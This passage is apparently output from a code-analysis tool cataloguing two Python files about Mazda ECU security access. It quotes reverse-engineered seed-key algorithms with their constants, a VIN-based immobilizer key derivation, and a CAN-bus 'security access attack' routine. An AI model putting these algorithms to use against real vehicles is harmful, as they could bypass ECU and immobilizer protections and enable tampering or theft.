SECURITY ACCESS ATTACK\"\"\""}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "return f\"Security access granted to {target_ecu}\""}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "return \"Security access failed\""}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "print(\"MAZDASPEED 3 COMPLETE SECURITY & TUNING EXPLOITATION\")"}, {"type": "hardware", "line": 394, "hardware": "ECU", "content": "ecu_exploit = MazdaECUExploit()"}, {"type": "hardware", "line": 399, "hardware": "ECU", "content": "print(\"\\n1. ECU SECURITY ACCESS BYPASS\")"}, {"type": "hardware", "line": 403, "hardware": "ECU", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "hardware", "line": 407, "hardware": "ECU", "content": "print(\"\\n2. ECU MEMORY MAP EXPLOITATION\")"}, {"type": "hardware", "line": 409, "hardware": "ECU", "content": "for area_name, area in ecu_exploit.ecu_memory_map.items():"}, {"type": "hardware", "line": 450, "hardware": "ECU", "content": "dump_payloads = diagnostic_exploits.execute_memory_dump()"}], "security_logic": [{"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 12, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 12, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 19, "pattern": "key", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "seed", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "algorithm", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 23, "pattern": "key", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 23, "pattern": "seed", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 24, "pattern": "key", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "seed", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "algorithm", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "algorithms = {"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "'algorithm': self._mazda_27_algorithm,"}, {"type": "security_pattern", "line": 29, "pattern": "seed", "content": "'seed_bytes': 4,"}, {"type": "security_pattern", "line": 30, "pattern": "key", "content": "'key_bytes': 4,"}, {"type": "security_pattern", "line": 35, "pattern": "algorithm", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "security_pattern", "line": 36, "pattern": "seed", "content": "'seed_bytes': 2,"}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "'key_bytes': 2,"}, {"type": "security_pattern", "line": 42, "pattern": "algorithm", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "security_pattern", "line": 43, "pattern": "seed", "content": "'seed_bytes': 8,"}, {"type": "security_pattern", "line": 44, "pattern": "key", "content": "'key_bytes': 8,"}, {"type": "security_pattern", "line": 45, "pattern": "key", "content": "'vulnerability': 'DES with weak key derivation'"}, {"type": "security_pattern", "line": 48, "pattern": "algorithm", "content": "return algorithms"}, {"type": "security_pattern", "line": 50, "pattern": "seed", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "security_pattern", "line": 53, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 54, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 58, "pattern": "seed", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 59, "pattern": "key", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 62, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 64, "pattern": "seed", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 65, "pattern": "algorithm", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "security_pattern", "line": 66, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 70, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 77, "pattern": "seed", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 77, "pattern": "algorithm", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "vin_key = self._derive_vin_key()"}, {"type": "security_pattern", "line": 81, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 84, "pattern": "key", "content": "des_key = vin_key[:8]  # Use first 8 bytes of derived key"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 86, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 86, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "encrypt", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "seed", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 89, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 91, "pattern": "key", "content": "def _derive_vin_key(self):"}, {"type": "security_pattern", "line": 92, "pattern": "key", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 97, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 98, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "return key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 148, "pattern": "algorithm", "content": "\"\"\"REAL-TUNE AI TUNING ALGORITHM\"\"\""}, {"type": "security_pattern", "line": 278, "pattern": "key", "content": "'method': 'Bypass security access without valid key',"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 357, "pattern": "security_access", "content": "def security_access_attack(self, target_ecu):"}, {"type": "security_pattern", "line": 360, "pattern": "seed", "content": "seed_msg = can.Message("}, {"type": "security_pattern", "line": 362, "pattern": "seed", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "security_pattern", "line": 365, "pattern": "seed", "content": "self.bus.send(seed_msg)"}, {"type": "security_pattern", "line": 371, "pattern": "seed", "content": "seed_response = self._receive_seed()"}, {"type": "security_pattern", "line": 372, "pattern": "seed", "content": "if seed_response:"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "seed = seed_response[2:6]  # Extract seed bytes"}, {"type": "security_pattern", "line": 374, "pattern": "key", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "seed", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "algorithm", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 377, "pattern": "key", "content": "key_msg = can.Message("}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}, {"type": "security_pattern", "line": 382, "pattern": "key", "content": "self.bus.send(key_msg)"}, {"type": "security_pattern", "line": 402, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 403, "pattern": "key", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "seed", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "algorithm", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 404, "pattern": "key", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}, {"type": "security_pattern", "line": 404, "pattern": "seed", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds2.py", "lines_read": 390, "features_found": [{"type": "function", "name": "__init__", "line": 39}, {"type": "function", "name": "_initialize_algorithms", "line": 43}, {"type": "function", "name": "calculate_seed_key", "line": 55}, {"type": "function", "name": "_algorithm_27_standard", "line": 88}, {"type": "function", "name": "_algorithm_27_enhanced", "line": 112}, {"type": "function", "name": "_algorithm_tcm", "line": 144}, {"type": "function", "name": "_algorithm_immobilizer", "line": 163}, {"type": "function", "name": "_derive_immobilizer_key", "line": 186}, {"type": "function", "name": "_algorithm_bcm", "line": 200}, {"type": "function", "name": "_algorithm_manufacturer", "line": 226}, {"type": "function", "name": "_get_manufacturer_key", "line": 244}, {"type": "function", "name": "_algorithm_calibration", "line": 254}, {"type": "function", "name": "request_seed", "line": 284}, {"type": "function", "name": "_get_seed_length_for_level", "line": 309}, {"type": "function", "name": "send_key", "line": 322}, {"type": "function", "name": "perform_security_access", "line": 346}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "MazdaSecurityAlgorithm", "line": 23}, {"type": "class", "name": "MazdaSecurityAccess", "line": 33}], "algorithms": [{"type": "algorithm_function", "line": 43, "content": "def _initialize_algorithms(self) -> Dict[MazdaSecurityAlgorithm, callable]:"}, {"type": "algorithm_function", "line": 55, "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "algorithm_function", "line": 88, "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 112, "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 144, "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 163, "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 186, "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "algorithm_function", "line": 200, "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 226, "content": "def _algorithm_manufacturer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 254, "content": "def _algorithm_calibration(self, seed: bytes, vin: Optional[str] = None,"}], "protocols": [{"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "ALGORITHM_27_STANDARD = 1      # Standard 0x27 security"}, {"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "Standard 0x27 Security Algorithm"}, {"type": "protocol", "line": 102, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed[i] ^ 0x73"}, {"type": "protocol", "line": 104, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "Enhanced 0x27 Security Algorithm"}, {"type": "protocol", "line": 129, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 3) | (temp >> 5)) & 0xFF"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= [0x47, 0x11, 0x83, 0x25][i]"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2D + i) & 0xFF"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (~temp & 0xFF) ^ 0xA5"}, {"type": "protocol", "line": 156, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 157, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 158, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 159, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 216, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x84) & 0xFF"}, {"type": "protocol", "line": 217, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x3D"}, {"type": "protocol", "line": 218, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 2) | (temp << 6)) & 0xFF"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp - 0x17) & 0xFF"}, {"type": "protocol", "line": 220, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0xA2, 0x4F, 0x8C, 0x31][i]"}, {"type": "protocol", "line": 274, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (seed_byte + data_byte) & 0xFF"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xB5"}, {"type": "protocol", "line": 276, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 4) | (temp >> 4)) & 0xFF"}, {"type": "protocol", "line": 277, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2A) & 0xFF"}, {"type": "protocol", "line": 278, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0x91, 0x3C, 0x67, 0xA8, 0x42, 0x7D][i]"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "MAZDA SECURITY ACCESS - Reverse Engineered Algorithms"}, {"type": "hardware", "line": 8, "hardware": "ECU", "content": "Complete security access implementation for all Mazda ECUs"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "class MazdaSecurityAlgorithm(IntEnum):"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "\"\"\"Mazda Security Algorithms - Reverse Engineered\"\"\""}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "ALGORITHM_27_STANDARD = 1      # Standard 0x27 security"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "ALGORITHM_27_ENHANCED = 2      # Enhanced security"}, {"type": "hardware", "line": 27, "hardware": "TCM", "content": "ALGORITHM_TCM = 3              # Transmission control module"}, {"type": "hardware", "line": 28, "hardware": "immobilizer", "content": "ALGORITHM_IMMOBILIZER = 4      # Immobilizer system"}, {"type": "hardware", "line": 29, "hardware": "BCM", "content": "ALGORITHM_BCM = 5              # Body control module"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "class MazdaSecurityAccess:"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "Complete Mazda Security Access Implementation"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "Reverse engineered from IDS/M-MDS security algorithms"}, {"type": "hardware", "line": 41, "hardware": "vehicle", "content": "self.vehicle_key_cache = {}"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "def _initialize_algorithms(self) -> Dict[MazdaSecurityAlgorithm, callable]:"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "\"\"\"Initialize all security algorithms\"\"\""}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_STANDARD: self._algorithm_27_standard,"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_ENHANCED: self._algorithm_27_enhanced,"}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_TCM: self._algorithm_tcm,"}, {"type": "hardware", "line": 48, "hardware": "TCM", "content": "MazdaSecurityAlgorithm.ALGORITHM_TCM: self._algorithm_tcm,"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_IMMOBILIZER: self._algorithm_immobilizer,"}, {"type": "hardware", "line": 49, "hardware": "immobilizer", "content": "MazdaSecurityAlgorithm.ALGORITHM_IMMOBILIZER: self._algorithm_immobilizer,"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_BCM: self._algorithm_bcm,"}, {"type": "hardware", "line": 50, "hardware": "BCM", "content": "MazdaSecurityAlgorithm.ALGORITHM_BCM: self._algorithm_bcm,"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_MANUFACTURER: self._algorithm_manufacturer,"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_CALIBRATION: self._algorithm_calibration"}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "Calculate security key from seed using specified algorithm"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "seed: Seed bytes from ECU"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "algorithm: Security algorithm to use"}, {"type": "hardware", "line": 63, "hardware": "vehicle", "content": "vin: Vehicle VIN for VIN-based algorithms"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "logger.error(f\"Unknown security algorithm: {algorithm}\")"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "Standard 0x27 Security Algorithm"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "Used for basic ECU access and diagnostics"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "Enhanced 0x27 Security Algorithm"}, {"type": "hardware", "line": 144, "hardware": "TCM", "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "TCM Security Algorithm"}, {"type": "hardware", "line": 147, "hardware": "TCM", "content": "TCM Security Algorithm"}, {"type": "hardware", "line": 151, "hardware": "TCM", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "hardware", "line": 163, "hardware": "immobilizer", "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 166, "hardware": "ECU", "content": "Immobilizer Security Algorithm"}, {"type": "hardware", "line": 166, "hardware": "immobilizer", "content": "Immobilizer Security Algorithm"}, {"type": "hardware", "line": 170, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "hardware", "line": 173, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "hardware", "line": 176, "hardware": "immobilizer", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 176, "hardware": "vehicle", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 179, "hardware": "vehicle", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "hardware", "line": 186, "hardware": "immobilizer", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "hardware", "line": 188, "hardware": "immobilizer", "content": "Derive immobilizer key from VIN"}, {"type": "hardware", "line": 195, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "hardware", "line": 196, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "hardware", "line": 200, "hardware": "BCM", "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "BCM Security Algorithm"}, {"type": "hardware", "line": 203, "hardware": "BCM", "content": "BCM Security Algorithm"}, {"type": "hardware", "line": 207, "hardware": "BCM", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "Manufacturer Security Algorithm"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "This would be obtained from secure storage in real implementation"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "Calibration Security Algorithm"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "def request_seed(self, ecu_address: int, security_level: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 286, "hardware": "ECU", "content": "Request seed from ECU for security access"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "ecu_address: ECU address to request seed from"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "seed_length = self._get_seed_length_for_level(security_level)"}, {"type": "hardware", "line": 302, "hardware": "ECU", "content": "logger.debug(f\"Generated seed for level {security_level}: {seed.hex().upper()}\")"}, {"type": "hardware", "line": 309, "hardware": "ECU", "content": "def _get_seed_length_for_level(self, security_level: int) -> int:"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "\"\"\"Get required seed length for security level\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "return seed_lengths.get(security_level, 4)"}, {"type": "hardware", "line": 322, "hardware": "ECU", "content": "def send_key(self, ecu_address: int, security_level: int, key: bytes) -> bool:"}, {"type": "hardware", "line": 324, "hardware": "ECU", "content": "Send calculated key to ECU for security access"}, {"type": "hardware", "line": 327, "hardware": "ECU", "content": "ecu_address: ECU address to send key to"}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 332, "hardware": "ECU", "content": "True if security access granted"}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "logger.debug(f\"Sending key for level {security_level}: {key.hex().upper()}\")"}, {"type": "hardware", "line": 346, "hardware": "ECU", "content": "def perform_security_access(self, ecu_address: int, security_level: int,"}, {"type": "hardware", "line": 347, "hardware": "ECU", "content": "algorithm: MazdaSecurityAlgorithm,"}, {"type": "hardware", "line": 351, "hardware": "ECU", "content": "Perform complete security access procedure"}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "ecu_address: ECU address to access"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "algorithm: Security algorithm to use"}, {"type": "hardware", "line": 357, "hardware": "vehicle", "content": "vin: Vehicle VIN (if required)"}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "True if security access successful"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "logger.info(f\"Performing security access for ECU 0x{ecu_address:04X}, level {security_level}\")"}, {"type": "hardware", "line": 367, "hardware": "ECU", "content": "seed = self.request_seed(ecu_address, security_level)"}, {"type": "hardware", "line": 369, "hardware": "ECU", "content": "logger.error(\"Failed to request seed from ECU\")"}, {"type": "hardware", "line": 375, "hardware": "ECU", "content": "logger.error(\"Failed to calculate security key\")"}, {"type": "hardware", "line": 379, "hardware": "ECU", "content": "access_granted = self.send_key(ecu_address, security_level, key)"}, {"type": "hardware", "line": 382, "hardware": "ECU", "content": "logger.info(\"Security access granted\")"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "logger.error(\"Security access denied\")"}, {"type": "hardware", "line": 389, "hardware": "ECU", "content": "logger.error(f\"Error during security access: {e}\")"}], "security_logic": [{"type": "security_pattern", "line": 7, "pattern": "algorithm", "content": "MAZDA SECURITY ACCESS - Reverse Engineered Algorithms"}, {"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 16, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 16, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 18, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 23, "pattern": "algorithm", "content": "class MazdaSecurityAlgorithm(IntEnum):"}, {"type": "security_pattern", "line": 24, "pattern": "algorithm", "content": "\"\"\"Mazda Security Algorithms - Reverse Engineered\"\"\""}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "ALGORITHM_27_STANDARD = 1      # Standard 0x27 security"}, {"type": "security_pattern", "line": 26, "pattern": "algorithm", "content": "ALGORITHM_27_ENHANCED = 2      # Enhanced security"}, {"type": "security_pattern", "line": 27, "pattern": "algorithm", "content": "ALGORITHM_TCM = 3              # Transmission control module"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "ALGORITHM_IMMOBILIZER = 4      # Immobilizer system"}, {"type": "security_pattern", "line": 29, "pattern": "algorithm", "content": "ALGORITHM_BCM = 5              # Body control module"}, {"type": "security_pattern", "line": 30, "pattern": "algorithm", "content": "ALGORITHM_MANUFACTURER = 6     # Manufacturer access"}, {"type": "security_pattern", "line": 31, "pattern": "algorithm", "content": "ALGORITHM_CALIBRATION = 7      # Calibration access"}, {"type": "security_pattern", "line": 36, "pattern": "algorithm", "content": "Reverse engineered from IDS/M-MDS security algorithms"}, {"type": "security_pattern", "line": 40, "pattern": "algorithm", "content": "self.algorithm_database = 